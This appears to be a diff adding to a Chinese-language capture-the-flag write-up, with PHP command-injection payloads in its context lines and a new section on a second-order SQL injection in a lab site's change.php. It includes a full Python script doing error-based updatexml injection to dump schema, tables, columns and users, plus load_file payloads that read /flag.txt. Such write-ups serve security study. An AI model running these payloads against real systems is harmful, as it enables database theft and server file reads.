@@ -117,3 +117,125 @@ payload为`?c=($pi=base_convert)(1751504350,10,36)($pi(8768397090111664438,10,30
 payload`?c=$pi=base_convert;$pi=$pi(53179,10,36)^$pi(1109136,10,36);${$pi}{0}(${$pi}{1})&0=system&1=cat /flag`
 
 ![image-20210424142210869](image-20210424142210869.png)
+
+## CyberPunk
+
+首页查看源代码,发现提示`?file=`可能可以读取源代码,成功读取
+
+发现在几个主要的页面的存在sql注入的过滤
+
+```php
+$pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
+```
+
+而在`change.php`中存在二次注入
+
+```php
+$address = addslashes($_POST["address"]);
+...
+$sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];
+$result = $db->query($sql);
+if(!$result) {
+	echo 'error';
+	print_r($db->error);
+	exit;
+}
+```
+
+`addslashes`在`' " \ NULL`后面添加`\`进行转义,但是`\`并不会写入到数据库中,在写入数据库的时候还是保留了原来的数据
+
+而在数据存入到数据库后,再次被取出时没有进行再一次的转义,因此造成了二次注入
+
+用`updatexml`进行报错注入(该语句对输出的字符长度做了限制,其最长输出32位)
+
+```python
+import requests
+import time
+
+url = "http://8af56c85-5ba8-4a09-9c16-144d33231017.node3.buuoj.cn"
+
+
+def confirm():
+    payload = url + "/confirm.php"
+    post_data = {'user_name': 'asdf', 'phone': 'asdf', 'address': 'asdf'}
+    requests.post(url=payload, data=post_data)
+
+
+def delete():
+    payload = url + "/delete.php"
+    post_data = {'user_name': 'asdf', 'phone': 'asdf'}
+    requests.post(url=payload, data=post_data)
+
+
+def change(sql):
+    payload = url + "/change.php"
+    post_data = {'user_name': 'asdf', 'phone': 'asdf', 'address': sql}
+    requests.post(url=payload, data=post_data)
+    r = requests.post(url=payload, data=post_data)
+    return r.text
+
+
+def get_schema_name():
+    for i in range(1, 100, 25):
+        sql = "1' and updatexml(1,concat(0x7e,(select substr(group_concat(schema_name),%d,%d) from information_schema.schemata),0x7e),1) #" % (i, i + 25)
+        confirm()
+        text = change(sql)
+        print(text)
+        delete()
+        if '~~' in text:
+            return
+        time.sleep(0.2)
+
+
+def get_table_name():
+    for i in range(1, 100, 25):
+        sql = "1' and updatexml(1,concat(0x7e,(select substr(group_concat(table_name),%d,%d) from information_schema.tables where table_schema='ctfusers'),0x7e),1) #" % (i, i + 25)
+        confirm()
+        text = change(sql)
+        print(text)
+        delete()
+        if '~~' in text:
+            return
+        time.sleep(0.2)
+
+
+def get_column_name():
+    for i in range(1, 5000, 25):
+        sql = "1' where user_id=updatexml(1,concat(0x7e,(select substr(group_concat(column_name),%d,%d)from information_schema.columns where table_name='user'),0x7e),1)#" % (i, i + 25)
+        confirm()
+        text = change(sql)
+        print(text)
+        delete()
+        if '~~' in text:
+            return
+        time.sleep(0.2)
+
+
+def get_detail():
+    for i in range(1, 100, 25):
+        sql = "1' where user_id=updatexml(1,concat(0x7e,(select substr(group_concat(user_name),%d,%d) from ctfusers.user),0x7e),1)#" % (i, i + 25)
+        confirm()
+        text = change(sql)
+        print(text)
+        delete()
+        if '~~' in text:
+            return
+        time.sleep(0.2)
+
+
+get_schema_name()
+get_table_name()
+get_column_name()
+get_detail()
+```
+
+但是`flag`不在数据库中???(ctftraining库中有个FLAG表,但是读不出来...)
+
+看`wp`说在根目录下`/flag.txt`中???
+
+```
+1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,20)),0x7e),1)#
+
+1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),20,40)),0x7e),1)#
+```
+
